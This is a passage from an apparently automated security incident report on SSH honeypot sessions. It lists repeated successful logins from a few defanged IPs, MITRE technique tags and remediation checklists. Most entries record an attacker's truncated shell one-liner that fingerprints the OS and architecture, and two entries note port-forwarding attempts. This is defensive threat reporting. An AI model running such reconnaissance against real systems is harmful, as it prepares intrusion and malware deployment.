- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3142f8e37a53

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-28 22:08 |
| **Last Seen** | 2026-07-28 22:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:08:09` | `cowrie.session.connect` |
| `2026-07-28 22:08:09` | `cowrie.client.version` |
| `2026-07-28 22:08:09` | `cowrie.client.kex` |
| `2026-07-28 22:08:10` | `cowrie.login.success` |
| `2026-07-28 22:08:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9291d0e25843

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-28 22:08 |
| **Last Seen** | 2026-07-28 22:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:08:09` | `cowrie.session.connect` |
| `2026-07-28 22:08:09` | `cowrie.client.version` |
| `2026-07-28 22:08:09` | `cowrie.client.kex` |
| `2026-07-28 22:08:10` | `cowrie.login.success` |
| `2026-07-28 22:08:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1c9e579a3ab

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 22:08 |
| **Last Seen** | 2026-07-28 22:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:08:37` | `cowrie.session.connect` |
| `2026-07-28 22:08:37` | `cowrie.client.version` |
| `2026-07-28 22:08:37` | `cowrie.client.kex` |
| `2026-07-28 22:08:39` | `cowrie.login.success` |
| `2026-07-28 22:08:40` | `cowrie.session.params` |
| `2026-07-28 22:08:40` | `cowrie.command.input` |
| `2026-07-28 22:08:40` | `cowrie.command.input` |
| `2026-07-28 22:08:40` | `cowrie.command.input` |
| `2026-07-28 22:08:40` | `cowrie.command.input` |
| `2026-07-28 22:08:40` | `cowrie.command.input` |
| `2026-07-28 22:08:40` | `cowrie.command.success` |
| `2026-07-28 22:08:40` | `cowrie.command.input` |
| `2026-07-28 22:08:40` | `cowrie.command.input` |
| `2026-07-28 22:08:40` | `cowrie.command.input` |
| `2026-07-28 22:08:40` | `cowrie.command.input` |
| `2026-07-28 22:08:41` | `cowrie.log.closed` |
| `2026-07-28 22:08:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca6f001e3cef

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 22:09 |
| **Last Seen** | 2026-07-28 22:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:09:59` | `cowrie.session.connect` |
| `2026-07-28 22:09:59` | `cowrie.client.version` |
| `2026-07-28 22:09:59` | `cowrie.client.kex` |
| `2026-07-28 22:10:01` | `cowrie.login.success` |
| `2026-07-28 22:10:02` | `cowrie.session.params` |
| `2026-07-28 22:10:02` | `cowrie.command.input` |
| `2026-07-28 22:10:02` | `cowrie.command.input` |
| `2026-07-28 22:10:02` | `cowrie.command.input` |
| `2026-07-28 22:10:02` | `cowrie.command.input` |
| `2026-07-28 22:10:02` | `cowrie.command.input` |
| `2026-07-28 22:10:02` | `cowrie.command.success` |
| `2026-07-28 22:10:02` | `cowrie.command.input` |
| `2026-07-28 22:10:02` | `cowrie.command.input` |
| `2026-07-28 22:10:02` | `cowrie.command.input` |
| `2026-07-28 22:10:02` | `cowrie.command.input` |
| `2026-07-28 22:10:02` | `cowrie.log.closed` |
| `2026-07-28 22:10:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d68e622eaa8e

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 22:11 |
| **Last Seen** | 2026-07-28 22:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:11:19` | `cowrie.session.connect` |
| `2026-07-28 22:11:19` | `cowrie.client.version` |
| `2026-07-28 22:11:19` | `cowrie.client.kex` |
| `2026-07-28 22:11:20` | `cowrie.login.success` |
| `2026-07-28 22:11:22` | `cowrie.session.params` |
| `2026-07-28 22:11:22` | `cowrie.command.input` |
| `2026-07-28 22:11:22` | `cowrie.command.input` |
| `2026-07-28 22:11:22` | `cowrie.command.input` |
| `2026-07-28 22:11:22` | `cowrie.command.input` |
| `2026-07-28 22:11:22` | `cowrie.command.input` |
| `2026-07-28 22:11:22` | `cowrie.command.success` |
| `2026-07-28 22:11:22` | `cowrie.command.input` |
| `2026-07-28 22:11:22` | `cowrie.command.input` |
| `2026-07-28 22:11:22` | `cowrie.command.input` |
| `2026-07-28 22:11:22` | `cowrie.command.input` |
| `2026-07-28 22:11:22` | `cowrie.log.closed` |
| `2026-07-28 22:11:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15e05a311b43

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 22:12 |
| **Last Seen** | 2026-07-28 22:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:12:37` | `cowrie.session.connect` |
| `2026-07-28 22:12:38` | `cowrie.client.version` |
| `2026-07-28 22:12:38` | `cowrie.client.kex` |
| `2026-07-28 22:12:39` | `cowrie.login.success` |
| `2026-07-28 22:12:40` | `cowrie.session.params` |
| `2026-07-28 22:12:40` | `cowrie.command.input` |
| `2026-07-28 22:12:40` | `cowrie.command.input` |
| `2026-07-28 22:12:40` | `cowrie.command.input` |
| `2026-07-28 22:12:40` | `cowrie.command.input` |
| `2026-07-28 22:12:40` | `cowrie.command.input` |
| `2026-07-28 22:12:40` | `cowrie.command.success` |
| `2026-07-28 22:12:40` | `cowrie.command.input` |
| `2026-07-28 22:12:40` | `cowrie.command.input` |
| `2026-07-28 22:12:40` | `cowrie.command.input` |
| `2026-07-28 22:12:40` | `cowrie.command.input` |
| `2026-07-28 22:12:41` | `cowrie.log.closed` |
| `2026-07-28 22:12:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-901662bef26f

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 22:13 |
| **Last Seen** | 2026-07-28 22:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:13:59` | `cowrie.session.connect` |
| `2026-07-28 22:13:59` | `cowrie.client.version` |
| `2026-07-28 22:13:59` | `cowrie.client.kex` |
| `2026-07-28 22:14:00` | `cowrie.login.success` |
| `2026-07-28 22:14:01` | `cowrie.session.params` |
| `2026-07-28 22:14:01` | `cowrie.command.input` |
| `2026-07-28 22:14:01` | `cowrie.command.input` |
| `2026-07-28 22:14:01` | `cowrie.command.input` |
| `2026-07-28 22:14:01` | `cowrie.command.input` |
| `2026-07-28 22:14:01` | `cowrie.command.input` |
| `2026-07-28 22:14:01` | `cowrie.command.success` |
| `2026-07-28 22:14:01` | `cowrie.command.input` |
| `2026-07-28 22:14:01` | `cowrie.command.input` |
| `2026-07-28 22:14:01` | `cowrie.command.input` |
| `2026-07-28 22:14:01` | `cowrie.command.input` |
| `2026-07-28 22:14:02` | `cowrie.log.closed` |
| `2026-07-28 22:14:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42c71d53ad34

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 22:15 |
| **Last Seen** | 2026-07-28 22:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:15:25` | `cowrie.session.connect` |
| `2026-07-28 22:15:25` | `cowrie.client.version` |
| `2026-07-28 22:15:25` | `cowrie.client.kex` |
| `2026-07-28 22:15:26` | `cowrie.login.success` |
| `2026-07-28 22:15:27` | `cowrie.session.params` |
| `2026-07-28 22:15:27` | `cowrie.command.input` |
| `2026-07-28 22:15:27` | `cowrie.command.input` |
| `2026-07-28 22:15:27` | `cowrie.command.input` |
| `2026-07-28 22:15:27` | `cowrie.command.input` |
| `2026-07-28 22:15:27` | `cowrie.command.input` |
| `2026-07-28 22:15:27` | `cowrie.command.success` |
| `2026-07-28 22:15:27` | `cowrie.command.input` |
| `2026-07-28 22:15:27` | `cowrie.command.input` |
| `2026-07-28 22:15:27` | `cowrie.command.input` |
| `2026-07-28 22:15:27` | `cowrie.command.input` |
| `2026-07-28 22:15:28` | `cowrie.log.closed` |
| `2026-07-28 22:15:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a65ede2a09a

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 22:16 |
| **Last Seen** | 2026-07-28 22:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:16:47` | `cowrie.session.connect` |
| `2026-07-28 22:16:47` | `cowrie.client.version` |
| `2026-07-28 22:16:47` | `cowrie.client.kex` |
| `2026-07-28 22:16:48` | `cowrie.login.success` |
| `2026-07-28 22:16:50` | `cowrie.session.params` |
| `2026-07-28 22:16:50` | `cowrie.command.input` |
| `2026-07-28 22:16:50` | `cowrie.command.input` |
| `2026-07-28 22:16:50` | `cowrie.command.input` |
| `2026-07-28 22:16:50` | `cowrie.command.input` |
| `2026-07-28 22:16:50` | `cowrie.command.input` |
| `2026-07-28 22:16:50` | `cowrie.command.success` |
| `2026-07-28 22:16:50` | `cowrie.command.input` |
| `2026-07-28 22:16:50` | `cowrie.command.input` |
| `2026-07-28 22:16:50` | `cowrie.command.input` |
| `2026-07-28 22:16:50` | `cowrie.command.input` |
| `2026-07-28 22:16:50` | `cowrie.log.closed` |
| `2026-07-28 22:16:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99eed9fc87da

| Field | Detail |
|---|---|
| **Source IP** | `196.216.81[.]126` |
| **First Seen** | 2026-07-28 22:17 |
| **Last Seen** | 2026-07-28 22:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:17:26` | `cowrie.session.connect` |
| `2026-07-28 22:17:26` | `cowrie.client.version` |
| `2026-07-28 22:17:26` | `cowrie.client.kex` |
| `2026-07-28 22:17:28` | `cowrie.login.success` |
| `2026-07-28 22:17:29` | `cowrie.direct-tcpip.request` |
| `2026-07-28 22:17:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.216.81[.]126` to AbuseIPDB if not already reported
- [ ] Block `196.216.81[.]126` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3888f9dfcc66

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 22:18 |
| **Last Seen** | 2026-07-28 22:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:18:06` | `cowrie.session.connect` |
| `2026-07-28 22:18:06` | `cowrie.client.version` |
| `2026-07-28 22:18:06` | `cowrie.client.kex` |
| `2026-07-28 22:18:07` | `cowrie.login.success` |
| `2026-07-28 22:18:08` | `cowrie.session.params` |
| `2026-07-28 22:18:08` | `cowrie.command.input` |
| `2026-07-28 22:18:08` | `cowrie.command.input` |
| `2026-07-28 22:18:08` | `cowrie.command.input` |
| `2026-07-28 22:18:08` | `cowrie.command.input` |
| `2026-07-28 22:18:08` | `cowrie.command.input` |
| `2026-07-28 22:18:08` | `cowrie.command.success` |
| `2026-07-28 22:18:08` | `cowrie.command.input` |
| `2026-07-28 22:18:08` | `cowrie.command.input` |
| `2026-07-28 22:18:08` | `cowrie.command.input` |
| `2026-07-28 22:18:08` | `cowrie.command.input` |
| `2026-07-28 22:18:09` | `cowrie.log.closed` |
| `2026-07-28 22:18:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cd12292fb98

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 22:19 |
| **Last Seen** | 2026-07-28 22:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:19:26` | `cowrie.session.connect` |
| `2026-07-28 22:19:27` | `cowrie.client.version` |
| `2026-07-28 22:19:27` | `cowrie.client.kex` |
| `2026-07-28 22:19:28` | `cowrie.login.success` |
| `2026-07-28 22:19:29` | `cowrie.session.params` |
| `2026-07-28 22:19:29` | `cowrie.command.input` |
| `2026-07-28 22:19:29` | `cowrie.command.input` |
| `2026-07-28 22:19:29` | `cowrie.command.input` |
| `2026-07-28 22:19:29` | `cowrie.command.input` |
| `2026-07-28 22:19:29` | `cowrie.command.input` |
| `2026-07-28 22:19:29` | `cowrie.command.success` |
| `2026-07-28 22:19:29` | `cowrie.command.input` |
| `2026-07-28 22:19:29` | `cowrie.command.input` |
| `2026-07-28 22:19:29` | `cowrie.command.input` |
| `2026-07-28 22:19:29` | `cowrie.command.input` |
| `2026-07-28 22:19:30` | `cowrie.log.closed` |
| `2026-07-28 22:19:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-645c7309ac67

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 22:20 |
| **Last Seen** | 2026-07-28 22:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:20:54` | `cowrie.session.connect` |
| `2026-07-28 22:20:54` | `cowrie.client.version` |
| `2026-07-28 22:20:54` | `cowrie.client.kex` |
| `2026-07-28 22:20:55` | `cowrie.login.success` |
| `2026-07-28 22:20:56` | `cowrie.session.params` |
| `2026-07-28 22:20:56` | `cowrie.command.input` |
| `2026-07-28 22:20:56` | `cowrie.command.input` |
| `2026-07-28 22:20:56` | `cowrie.command.input` |
| `2026-07-28 22:20:56` | `cowrie.command.input` |
| `2026-07-28 22:20:56` | `cowrie.command.input` |
| `2026-07-28 22:20:56` | `cowrie.command.success` |
| `2026-07-28 22:20:56` | `cowrie.command.input` |
| `2026-07-28 22:20:56` | `cowrie.command.input` |
| `2026-07-28 22:20:56` | `cowrie.command.input` |
| `2026-07-28 22:20:56` | `cowrie.command.input` |
| `2026-07-28 22:20:57` | `cowrie.log.closed` |
| `2026-07-28 22:20:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce541405d356

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 22:22 |
| **Last Seen** | 2026-07-28 22:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:22:25` | `cowrie.session.connect` |
| `2026-07-28 22:22:26` | `cowrie.client.version` |
| `2026-07-28 22:22:26` | `cowrie.client.kex` |
| `2026-07-28 22:22:26` | `cowrie.login.success` |
| `2026-07-28 22:22:28` | `cowrie.session.params` |
| `2026-07-28 22:22:28` | `cowrie.command.input` |
| `2026-07-28 22:22:28` | `cowrie.command.input` |
| `2026-07-28 22:22:28` | `cowrie.command.input` |
| `2026-07-28 22:22:28` | `cowrie.command.input` |
| `2026-07-28 22:22:28` | `cowrie.command.input` |
| `2026-07-28 22:22:28` | `cowrie.command.success` |
| `2026-07-28 22:22:28` | `cowrie.command.input` |
| `2026-07-28 22:22:28` | `cowrie.command.input` |
| `2026-07-28 22:22:28` | `cowrie.command.input` |
